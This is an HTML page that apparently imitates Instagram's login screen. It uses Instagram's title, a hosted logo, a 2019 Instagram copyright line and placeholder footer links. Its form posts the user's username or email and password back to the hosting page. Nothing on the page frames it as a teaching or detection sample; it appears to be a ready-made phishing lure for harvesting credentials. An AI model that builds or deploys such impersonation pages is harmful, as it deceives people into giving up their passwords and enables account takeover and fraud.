<!DOCTYPE html>
<html>
	<head>
		<title>Login • Instagram</title> 
	</head>
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
	<style>
		body {
		  background-color: #FAFAFA;
		  color: #DCDCDC;
		  font-family: Open Sans;
		}
		.login-box {
		  margin-top: 100px;
		  text-align: center;
		  width: 430px;
		  height: 380px;
		  background-color: white;
		  padding: 60px; 
		}
		.logo {
		  height: 70px;
		  margin-bottom: 30px;
		}
		.form-control {
		  margin-bottom: 20px;
		}
		.btn {
		  width: 100%;
		  font-size: 16px;
		}
	</style>

	<body>
		<div class="well login-box center-block">
			<img class="logo" src="https://i.imgur.com/zqpwkLQ.png">
			<form name="login" method="POST">
				<input type="text" class="form-control" placeholder="Phone number, username, or email" name="userid" />
				<input type="password" class="form-control" id="pass" placeholder="Password" name="passw" />
				<input class="btn btn-primary" type="submit" value="Log In" />
			</form>
		</div>
		<nav class="text-center">
		  <a href="#">ABOUT US</a> |
		  <a href="#">SUPPORT</a> |
		  <a href="#/">PRESS</a>
		  © 2019 INSTAGRAM
		</nav>
	</body>
</html>
